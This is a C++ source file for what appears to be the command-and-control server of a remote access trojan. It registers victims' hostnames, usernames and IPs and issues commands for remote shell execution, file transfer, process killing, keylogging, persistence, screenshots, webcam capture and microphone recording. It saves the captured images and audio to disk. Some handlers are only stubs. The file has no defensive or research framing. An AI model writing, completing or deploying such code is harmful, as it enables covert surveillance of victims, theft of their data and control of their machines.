#include "server.h"
#include <sstream>
#include <iomanip>
#include <fstream>

// ClientHandler implementation
ClientHandler::ClientHandler(std::shared_ptr<Connection> conn)
    : connection(conn), is_running(false)
{
    ip_address = connection->getRemoteAddress();
    port = connection->getRemotePort();
    client_id = Utils::generateRandomString(16);

    setupCommandHandlers();
}

ClientHandler::~ClientHandler()
{
    stop();
}

void ClientHandler::setupCommandHandlers()
{
    command_handlers[CMD_PING] = std::bind(&ClientHandler::handlePing, this,
                                           std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_SYSTEM_INFO] = std::bind(&ClientHandler::handleSystemInfo, this,
                                                  std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_SHELL_EXEC] = std::bind(&ClientHandler::handleShellExec, this,
                                                 std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_FILE_LIST] = std::bind(&ClientHandler::handleFileList, this,
                                                std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_FILE_DOWNLOAD] = std::bind(&ClientHandler::handleFileDownload, this,
                                                    std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_FILE_UPLOAD] = std::bind(&ClientHandler::handleFileUpload, this,
                                                  std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_PROCESS_LIST] = std::bind(&ClientHandler::handleProcessList, this,
                                                   std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_PROCESS_KILL] = std::bind(&ClientHandler::handleProcessKill, this,
                                                   std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_SCREENSHOT] = std::bind(&ClientHandler::handleScreenshot, this,
                                                 std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_KEYLOG_START] = std::bind(&ClientHandler::handleKeylogger, this,
                                                   std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_KEYLOG_STOP] = std::bind(&ClientHandler::handleKeylogger, this,
                                                  std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_KEYLOG_DUMP] = std::bind(&ClientHandler::handleKeylogger, this,
                                                  std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_PERSISTENCE] = std::bind(&ClientHandler::handlePersistence, this,
                                                  std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_REMOVE_PERSISTENCE] = std::bind(&ClientHandler::handlePersistence, this,
                                                         std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_WEBCAM_CAPTURE] = std::bind(&ClientHandler::handleWebcam, this,
                                                     std::placeholders::_1, std::placeholders::_2);
    command_handlers[CMD_MIC_RECORD] = std::bind(&ClientHandler::handleMicrophone, this,
                                                 std::placeholders::_1, std::placeholders::_2);
}

void ClientHandler::start()
{
    if (is_running)
        return;

    is_running = true;
    client_thread = std::thread(&ClientHandler::handleClient, this);

    // Request system information
    executeCommand(CMD_SYSTEM_INFO);
}

void ClientHandler::stop()
{
    if (!is_running)
        return;

    is_running = false;
    connection->disconnect();

    if (client_thread.joinable())
    {
        client_thread.join();
    }
}

bool ClientHandler::isConnected() const
{
    return connection->isConnected();
}

bool ClientHandler::executeCommand(uint16_t command, const std::vector<uint8_t> &payload)
{
    if (!isConnected())
        return false;

    try
    {
        return connection->sendPacket(command, payload);
    }
    catch (const std::exception &e)
    {
        std::cerr << "Error executing command: " << e.what() << std::endl;
        return false;
    }
}

void ClientHandler::handleClient()
{
    while (is_running && isConnected())
    {
        try
        {
            // Receive command from client
            auto [command, payload] = connection->recvPacket();

            // Extract sequence number from header
            PacketHeader *header = reinterpret_cast<PacketHeader *>(payload.data());
            uint32_t sequence = header->sequence;

            // Handle command
            auto it = command_handlers.find(command);
            if (it != command_handlers.end())
            {
                try
                {
                    it->second(payload, sequence);
                }
                catch (const std::exception &e)
                {
                    std::cerr << "Error handling command " << command
                              << ": " << e.what() << std::endl;
                    connection->sendResponse(STATUS_ERROR_GENERAL, sequence, {});
                }
            }
            else
            {
                connection->sendResponse(STATUS_ERROR_NOT_IMPLEMENTED, sequence, {});
            }
        }
        catch (const std::exception &e)
        {
            if (is_running)
            {
                std::cerr << "Error in client handler: " << e.what() << std::endl;
                break;
            }
        }
    }

    if (is_running)
    {
        // Connection was lost
        is_running = false;
    }
}

bool ClientHandler::handleSystemInfo(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    if (payload.size() < sizeof(PacketHeader))
    {
        connection->sendResponse(STATUS_ERROR_GENERAL, sequence, {});
        return false;
    }

    // Skip header and parse system info
    std::string info(reinterpret_cast<const char *>(payload.data() + sizeof(PacketHeader)),
                     payload.size() - sizeof(PacketHeader));

    std::istringstream iss(info);
    std::string line;

    while (std::getline(iss, line))
    {
        std::istringstream line_iss(line);
        std::string key, value;

        if (std::getline(line_iss, key, ':') && std::getline(line_iss, value))
        {
            value.erase(0, value.find_first_not_of(" \t"));

            if (key == "Hostname")
            {
                hostname = value;
            }
            else if (key == "OS")
            {
                os_info = value;
            }
            else if (key == "Username")
            {
                username = value;
            }
        }
    }

    std::cout << "Client connected: " << client_id << std::endl;
    std::cout << "  Hostname: " << hostname << std::endl;
    std::cout << "  OS: " << os_info << std::endl;
    std::cout << "  Username: " << username << std::endl;
    std::cout << "  IP: " << ip_address << ":" << port << std::endl;

    connection->sendResponse(STATUS_SUCCESS, sequence, {});
    return true;
}

bool ClientHandler::handlePing(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    // Echo back the payload
    connection->sendResponse(STATUS_SUCCESS, sequence, payload);
    return true;
}

bool ClientHandler::handleShellExec(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    connection->sendResponse(STATUS_SUCCESS, sequence, {});
    std::cout << "Shell command executed on " << client_id << std::endl;
    return true;
}

bool ClientHandler::handleFileList(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    connection->sendResponse(STATUS_SUCCESS, sequence, {});
    std::cout << "File list received from " << client_id << std::endl;
    return true;
}

bool ClientHandler::handleFileDownload(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    // In a real implementation, we would save the file to disk
    connection->sendResponse(STATUS_SUCCESS, sequence, {});
    std::cout << "File downloaded from " << client_id << std::endl;
    return true;
}

bool ClientHandler::handleFileUpload(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    connection->sendResponse(STATUS_SUCCESS, sequence, {});
    std::cout << "File uploaded to " << client_id << std::endl;
    return true;
}

bool ClientHandler::handleProcessList(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    connection->sendResponse(STATUS_SUCCESS, sequence, {});
    std::cout << "Process list received from " << client_id << std::endl;
    return true;
}

bool ClientHandler::handleProcessKill(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    connection->sendResponse(STATUS_SUCCESS, sequence, {});
    std::cout << "Process killed on " << client_id << std::endl;
    return true;
}

bool ClientHandler::handleScreenshot(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    if (payload.size() <= sizeof(PacketHeader))
    {
        connection->sendResponse(STATUS_ERROR_GENERAL, sequence, {});
        return false;
    }

    // Save screenshot to file
    std::string filename = "screenshot_" + client_id + "_" +
                           std::to_string(time(nullptr)) + ".png";

    std::ofstream outfile(filename, std::ios::binary);
    if (outfile.is_open())
    {
        outfile.write(reinterpret_cast<const char *>(payload.data() + sizeof(PacketHeader)),
                      payload.size() - sizeof(PacketHeader));
        outfile.close();

        std::cout << "Screenshot saved: " << filename << std::endl;
        connection->sendResponse(STATUS_SUCCESS, sequence, {});
        return true;
    }
    else
    {
        std::cerr << "Failed to save screenshot" << std::endl;
        connection->sendResponse(STATUS_ERROR_GENERAL, sequence, {});
        return false;
    }
}

bool ClientHandler::handleKeylogger(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    connection->sendResponse(STATUS_SUCCESS, sequence, {});
    return true;
}

bool ClientHandler::handlePersistence(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    connection->sendResponse(STATUS_SUCCESS, sequence, {});
    return true;
}

bool ClientHandler::handleWebcam(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    if (payload.size() <= sizeof(PacketHeader))
    {
        connection->sendResponse(STATUS_ERROR_GENERAL, sequence, {});
        return false;
    }

    // Save webcam image to file
    std::string filename = "webcam_" + client_id + "_" +
                           std::to_string(time(nullptr)) + ".jpg";

    std::ofstream outfile(filename, std::ios::binary);
    if (outfile.is_open())
    {
        outfile.write(reinterpret_cast<const char *>(payload.data() + sizeof(PacketHeader)),
                      payload.size() - sizeof(PacketHeader));
        outfile.close();

        std::cout << "Webcam image saved: " << filename << std::endl;
        connection->sendResponse(STATUS_SUCCESS, sequence, {});
        return true;
    }
    else
    {
        std::cerr << "Failed to save webcam image" << std::endl;
        connection->sendResponse(STATUS_ERROR_GENERAL, sequence, {});
        return false;
    }
}

bool ClientHandler::handleMicrophone(const std::vector<uint8_t> &payload, uint32_t sequence)
{
    if (payload.size() <= sizeof(PacketHeader))
    {
        connection->sendResponse(STATUS_ERROR_GENERAL, sequence, {});
        return false;
    }

    // Save audio to file
    std::string filename = "audio_" + client_id + "_" +
                           std::to_string(time(nullptr)) + ".wav";

    std::ofstream outfile(filename, std::ios::binary);
    if (outfile.is_open())
    {
        outfile.write(reinterpret_cast<const char *>(payload.data() + sizeof(PacketHeader)),
                      payload.size() - sizeof(PacketHeader));
        outfile.close();

        std::cout << "Audio saved: " << filename << std::endl;
        connection->sendResponse(STATUS_SUCCESS, sequence, {});
        return true;
    }
    else
    {
        std::cerr << "Failed to save audio" << std::endl;
        connection->sendResponse(STATUS_ERROR_GENERAL, sequence, {});
        return false;
    }
}

// Server implementation
Server::Server(uint16_t port, const std::string &bind_addr)
    : port(port), bind_address(bind_addr), is_running(false), server_socket(-1)
{
}

Server::~Server()
{
    stop();
}

void Server::start()
{
    if (is_running)
        return;

    // Create socket
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket < 0)
    {
        throw std::runtime_error("Failed to create server socket");
    }

    // Set socket options
    int opt = 1;
    if (setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0)
    {
        close(server_socket);
        throw std::runtime_error("Failed to set socket options");
    }

    // Bind socket
    struct sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr(bind_address.c_str());
    address.sin_port = htons(port);

    if (bind(server_socket, (struct sockaddr *)&address, sizeof(address)) < 0)
    {
        close(server_socket);
        throw std::runtime_error("Failed to bind socket");
    }

    // Listen for connections
    if (listen(server_socket, 5) < 0)
    {
        close(server_socket);
        throw std::runtime_error("Failed to listen on socket");
    }

    std::cout << "Server started on " << bind_address << ":" << port << std::endl;

    is_running = true;
    accept_thread = std::thread(&Server::acceptConnections, this);
}

void Server::stop()
{
    if (!is_running)
        return;

    is_running = false;

    // Close server socket
    if (server_socket >= 0)
    {
        close(server_socket);
        server_socket = -1;
    }

    // Wait for accept thread to finish
    if (accept_thread.joinable())
    {
        accept_thread.join();
    }

    // Stop all clients
    std::lock_guard<std::mutex> lock(clients_mutex);
    for (auto &client : clients)
    {
        client.second->stop();
    }
    clients.clear();

    std::cout << "Server stopped" << std::endl;
}

void Server::setClientCallback(std::function<void(std::shared_ptr<ClientHandler>)> callback)
{
    client_callback = callback;
}

std::vector<std::string> Server::getClientList() const
{
    std::vector<std::string> list;
    std::lock_guard<std::mutex> lock(clients_mutex);

    for (const auto &client : clients)
    {
        list.push_back(client.first);
    }

    return list;
}

std::shared_ptr<ClientHandler> Server::getClient(const std::string &client_id) const
{
    std::lock_guard<std::mutex> lock(clients_mutex);

    auto it = clients.find(client_id);
    if (it != clients.end())
    {
        return it->second;
    }

    return nullptr;
}

bool Server::removeClient(const std::string &client_id)
{
    std::lock_guard<std::mutex> lock(clients_mutex);

    auto it = clients.find(client_id);
    if (it != clients.end())
    {
        it->second->stop();
        clients.erase(it);
        std::cout << "Client removed: " << client_id << std::endl;
        return true;
    }

    return false;
}

void Server::broadcastCommand(uint16_t command, const std::vector<uint8_t> &payload)
{
    std::lock_guard<std::mutex> lock(clients_mutex);

    for (auto it = clients.begin(); it != clients.end();)
    {
        if (it->second->isConnected())
        {
            it->second->executeCommand(command, payload);
            ++it;
        }
        else
        {
            // Remove disconnected clients
            std::cout << "Client disconnected: " << it->first << std::endl;
            it = clients.erase(it);
        }
    }
}

void Server::acceptConnections()
{
    while (is_running)
    {
        struct sockaddr_in address;
        socklen_t addrlen = sizeof(address);

        // Accept connection
        int client_socket = accept(server_socket, (struct sockaddr *)&address, &addrlen);
        if (client_socket < 0)
        {
            if (is_running)
            {
                std::cerr << "Failed to accept connection: " << strerror(errno) << std::endl;
            }
            continue;
        }

        // Get client IP address
        char ip_str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &(address.sin_addr), ip_str, INET_ADDRSTRLEN);
        std::string ip_address(ip_str);
        int port = ntohs(address.sin_port);

        std::cout << "New connection from " << ip_address << ":" << port << std::endl;

        try
        {
            // Create connection object
            auto connection = std::make_shared<Connection>(client_socket, ip_address, port, true);

            // Create client handler
            auto client = std::make_shared<ClientHandler>(connection);
            client->start();

            // Add client to list
            std::lock_guard<std::mutex> lock(clients_mutex);
            clients[client->getClientId()] = client;

            // Call client callback if set
            if (client_callback)
            {
                client_callback(client);
            }
        }
        catch (const std::exception &e)
        {
            std::cerr << "Error handling client: " << e.what() << std::endl;
            close(client_socket);
        }
    }
}